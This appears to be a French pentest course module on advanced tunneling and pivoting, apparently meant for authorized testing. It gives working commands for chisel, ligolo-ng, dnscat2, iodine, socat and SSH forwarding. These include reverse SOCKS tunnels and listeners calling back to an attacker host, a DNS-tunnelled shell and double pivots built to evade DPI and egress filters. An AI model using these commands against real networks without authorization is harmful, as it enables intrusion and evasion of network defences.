# 18 — Advanced Tunneling

## Objectifs
Contourner le DPI et les restrictions réseau : chisel, ligolo-ng, tunneling DNS (dnscat2), rebonds multiples et tunnels fiables.

---

## 1. Quand SSH ne suffit pas

| Restriction | Solution |
|---|---|
| SSH sortant bloqué (22) | chisel sur 80/443, ligolo |
| Seul DNS sort | dnscat2, iodine |
| Proxy HTTP obligatoire | chisel avec `--proxy` |
| Besoin de rapidité | ligolo-ng (TUN, pas de proxychains) |
| Ports filtrés sauf 80/443 | tunnel HTTP(S) |

---

## 2. chisel (le couteau suisse)

Binaire unique Go, tunnel TCP/UDP sur HTTP, avec SOCKS5 et reverse.

```bash
# Préparer les binaires
# https://github.com/jpillora/chisel/releases
tar xzf chisel_*_linux_amd64.gz
# Serveur (attaquant)
./chisel server -p 8080 --reverse

# Client (cible Linux) : SOCKS inverse
./chisel client <LHOST>:8080 R:socks

# Client (cible) : port forward inverse 8081 → service interne
./chisel client <LHOST>:8080 R:8081:10.10.10.50:80

# Client : forward local (si la cible a accès à un réseau)
./chisel client <LHOST>:8080 9000:10.10.10.50:445
```

```bash
# Côté attaquant : proxychains vers le socks (port 1080 par défaut)
proxychains4 nmap -sT -Pn -p80,445 10.10.10.0/24
```

```bash
# Windows
chisel.exe client <LHOST>:8080 R:socks
```

### Variante : serveur sur la cible
```bash
# Cible (pas d'accès entrant) : on héberge le serveur, l'attaquant se connecte
./chisel server -p 8080 --reverse
# Attaquant
./chisel client <TARGET>:8080 R:socks
```

### TLS / discrétion
```bash
./chisel server -p 443 --tls --reverse
./chisel client https://<LHOST>:443 R:socks
```

---

## 3. ligolo-ng (le plus rapide)

Crée une interface TUN : plus besoin de proxychains, tout le trafic passe.

```bash
# Attaquant
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# Cible
./agent -connect <LHOST>:11601 -ignore-cert
```

```bash
# Console proxy
session                    # sélectionner l'agent
iface                      # voir les réseaux
iface create tun0
iface add -net 172.16.5.0/24 -tun tun0
start
```

```bash
# Puis, côté attaquant
sudo ip route add 172.16.5.0/24 dev tun0
nmap -sS -p- 172.16.5.10        # scan normal, rapide
```

### Double pivot
```bash
# Sur PIVOT2 (déjà atteint via PIVOT1)
./agent -connect 172.16.5.10:11601 -ignore-cert -retry
# Dans la console
session
iface add -net 192.168.1.0/24 -tun tun0
```

### Listener (reverse shells à travers le tunnel)
```bash
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
listener_list
```

---

## 4. dnscat2 (tunneling DNS)

Utile quand **seul** le DNS sort. Lent mais passe les proxies restrictifs.

```bash
# Serveur (attaquant) : nécessite un domaine dont on contrôle le NS
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server && bundle install
ruby dnscat2.rb <DOMAIN> --no-cache

# Client (cible)
./dnscat2 <DOMAIN>
```

```bash
# Dans la console dnscat2
sessions
session -i 1
shell
# Puis redirection de port
listen 127.0.0.1:4455 10.10.10.50:445
```

Variante plus simple : **iodine** si un serveur DNS contrôlé est disponible.

```bash
# Serveur
iodined -f -c -P <PASS> 10.0.0.1 tunnel.<DOMAIN>
# Client
iodine -f -P <PASS> tunnel.<DOMAIN>
```

---

## 5. Tunnel via proxy HTTP

```bash
# chisel derrière un proxy d'entreprise
./chisel client --proxy http://proxy:8080 <LHOST>:443 R:socks

# Ou via Burp
./chisel client --proxy http://127.0.0.1:8080 https://<LHOST>:443 R:socks
```

```bash
# proxychains avec proxy HTTP
# /etc/proxychains4.conf
http 127.0.0.1 8080
```

---

## 6. Redirections simples (rappel)

```bash
# socat : écoute 8080 et relaie
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.50:80

# SSH local/remote/dynamic (voir module 17)
ssh -L 8080:10.10.10.50:80 <USER>@<PIVOT>
ssh -R 8080:127.0.0.1:80 <USER>@<LHOST>
ssh -D 1080 -N -f <USER>@<PIVOT>
```

---

## 7. Choisir vite (table de décision)

| Contrainte | Outil | Commande clé |
|---|---|---|
| SSH dispo | ssh | `-L`, `-R`, `-D` |
| Port 80/443 dispo, binaire uploadable | chisel | `R:socks` |
| Besoin de vitesse / scans | ligolo | `iface add` |
| Seul DNS | dnscat2 / iodine | `--no-cache` |
| Windows, pas de binaire | netsh / plink | `portproxy` |
| Un seul port à exposer | socat | `TCP-LISTEN` |

---

## 8. Dépannage

| Problème | Solution |
|---|---|
| chisel `connection refused` | port/protocole, tester `curl` |
| SOCKS mais pas de résolution DNS | `proxy_dns` dans proxychains |
| ligolo : pas de route | `ip route add ... dev tun0` |
| agent ligolo se déconnecte | `-retry`, vérifier `-ignore-cert` |
| dnscat2 : pas de session | vérifier l'enregistrement NS du domaine |
| Tunnel très lent | normal en DNS ; préférer chisel |
| `nmap -sS` via proxychains | impossible, utiliser `-sT` |

---

## 9. Checklist

- [ ] Réseaux accessibles depuis le pivot listés
- [ ] Contraintes réseau identifiées (ports sortants autorisés)
- [ ] Outil choisi selon la table de décision
- [ ] Binaire transféré et exécuté
- [ ] Tunnel établi + test (`curl`, `nc`, `nmap -sT`)
- [ ] Routes ajoutées si TUN (ligolo)
- [ ] Tunnel documenté et nettoyé en fin de test
